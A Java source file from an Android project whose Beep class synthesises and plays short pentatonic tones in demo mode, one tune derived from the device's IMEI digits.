package com.android.networking;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Utils;

import android.app.PendingIntent;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;

public class Beep {

	static double DO = 1046.50;
	static double RE = 1174.66;
	static double MI = 1318.51;
	static double SOL = 1567.98;
	static double LA = 1760.00;

	static double[] pentatonic = new double[] { DO, RE, MI, SOL, LA };

	static byte[] genTone(double duration, double freqOfTone) {
		int sampleRate = 8000;
		int numSamples = (int) (duration * sampleRate);
		// double freqOfTone = 440; // hz

		double sample[] = new double[numSamples];
		byte generatedSnd[] = new byte[2 * numSamples];

		double quinta = Math.pow(2, 7 / 12.0);
		double terza = Math.pow(2, 4 / 12.0);
		// fill out the array
		for (int i = 0; i < numSamples; ++i) {
			sample[i] = Math.sin(2 * Math.PI * i / (sampleRate / freqOfTone)) * .7
					+ Math.sin(2 * Math.PI * i / (sampleRate / (freqOfTone * terza))) * .2
					+ Math.sin(2 * Math.PI * i / (sampleRate / (freqOfTone * quinta))) * .1;
		}

		// convert to 16 bit pcm sound array
		// assumes the sample buffer is normalised.
		int idx = 0;
		for (final double dVal : sample) {
			// scale to maximum amplitude
			final short val = (short) ((dVal * 32767));
			// in 16 bit wav PCM, first byte is the low order byte
			generatedSnd[idx++] = (byte) (val & 0x00ff);
			generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);

		}

		return generatedSnd;
	}

	static void playSound(byte[] generatedSnd) {
		int sampleRate = 8000;
		final AudioTrack audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC, sampleRate,
				AudioFormat.CHANNEL_CONFIGURATION_MONO, AudioFormat.ENCODING_PCM_16BIT, generatedSnd.length,
				AudioTrack.MODE_STATIC);
		int ret = audioTrack.setStereoVolume(1.0F, 1.0F);
		ret = audioTrack.write(generatedSnd, 0, generatedSnd.length);
		audioTrack.play();
	}

	public static void beep() {
		if (Cfg.DEMO) {

			Status.self().getDefaultHandler().post(new Runnable() {

				public void run() {
					double s = .1;
					double c = .2;
					byte[] sound = Utils.concat(genTone(s, 1046.5), genTone(s, 1318.51), genTone(s, 1567.98),
							genTone(s, 1567.98), genTone(s, 1318.51), genTone(s, 1046.5), genTone(c, 783.99));
					playSound(sound);
				}
			});
		}
	}

	public static void beepPenta() {
		if (Cfg.DEMO) {

			String imei = Device.self().getImei();
			int len = imei.length();
			double[] notes = new double[7];
			for (int i = 0; i < notes.length; i++) {
				char c = imei.charAt(len - i - 1);
				int noteIdx = (int) c % pentatonic.length;

				notes[i] = pentatonic[noteIdx];
			}
			double s = .1;
			double c = .2;
			double p = .4;

			final byte[] sound = Utils.concat(genTone(s, notes[0]), genTone(c, notes[1]), genTone(s, notes[2]),
					genTone(c, notes[3]), genTone(s, notes[4]), genTone(c, notes[5]), genTone(p, notes[5]));

			Status.self().getDefaultHandler().post(new Runnable() {

				public void run() {
					playSound(sound);
				}
			});
		}
	}
}
